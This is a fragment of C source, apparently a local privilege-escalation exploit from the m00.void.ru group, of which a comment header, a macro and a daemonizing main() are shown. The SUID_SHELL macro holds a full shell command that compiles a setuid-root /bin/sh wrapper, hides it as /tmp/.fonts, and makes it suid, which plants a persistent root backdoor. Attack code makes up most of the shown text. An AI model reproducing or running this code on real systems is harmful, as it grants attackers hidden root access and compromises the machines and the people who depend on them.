 ...
 *
 *  + daemon mode
 *  + creates suid shell /tmp/.fonts
 *
 *  thx to v1pee for idea
 *
 * m00.void.ru
*/
...
#define SUID_SHELL "echo 'main() { setuid(0);setgid(0);execl(\"/bin/sh\",\"/bin/sh\",0); }' > /tmp/.f.c;gcc -o /tmp/.fonts /tmp/.f.c;chown root.root /tmp/.fonts; chmod ug+s /tmp/.fonts"
...
int main(void) {
    pid_t chld;
    if ((chld = fork()) == (pid_t) -1) {
            perror("fork()");
            exit(0);
        } else if (chld != (pid_t) 0) {
            exit(0);       /* parent exits */
        } else { main2(); }
}
